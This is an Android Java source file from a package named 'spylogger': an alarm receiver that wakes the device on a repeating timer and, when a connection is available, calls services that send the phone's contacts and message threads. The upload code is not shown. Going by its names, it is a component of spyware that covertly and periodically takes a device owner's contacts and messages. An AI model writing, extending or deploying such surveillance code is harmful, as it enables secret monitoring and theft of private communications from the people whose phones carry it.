package com.gravatasufoca.spylogger.receivers;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.services.SendContatosService;
import com.gravatasufoca.spylogger.services.SendMensagensService;
import com.gravatasufoca.spylogger.utils.Utils;

import java.sql.SQLException;

public class Alarm extends BroadcastReceiver{

	private PendingIntent pi;

	@Override
	 public void onReceive(Context context, Intent intent) {
		try {
			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);

			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();

			if(configuracao!=null){
				if(Utils.isConnected(context,configuracao.isWifi())) {
					SendContatosService sendContatosService = new SendContatosService(context, null);
					sendContatosService.enviarContatos();

					SendMensagensService sendMensagensService = new SendMensagensService(context, null);
					sendMensagensService.enviarTopicos();
				}
			}

		} catch (SQLException e) {
			e.printStackTrace();
		}

	 }


	 public void SetAlarm(Context context, int minutos)
	    {
	        AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
	        Intent intent = new Intent(context, Alarm.class);
	        pi = PendingIntent.getBroadcast(context, 0, intent, 0);
	        am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000 * 60 * minutos , pi);
	    }

	    public void CancelAlarm(Context context)
	    {
	        Intent intent = new Intent(context, Alarm.class);
	       // PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
	        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
	        alarmManager.cancel(pi);
	    }

	    public void setOnetimeTimer(Context context){
	     AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
	        Intent intent = new Intent(context, Alarm.class);
	        pi = PendingIntent.getBroadcast(context, 0, intent, 0);
	        am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pi);
	    }
	}
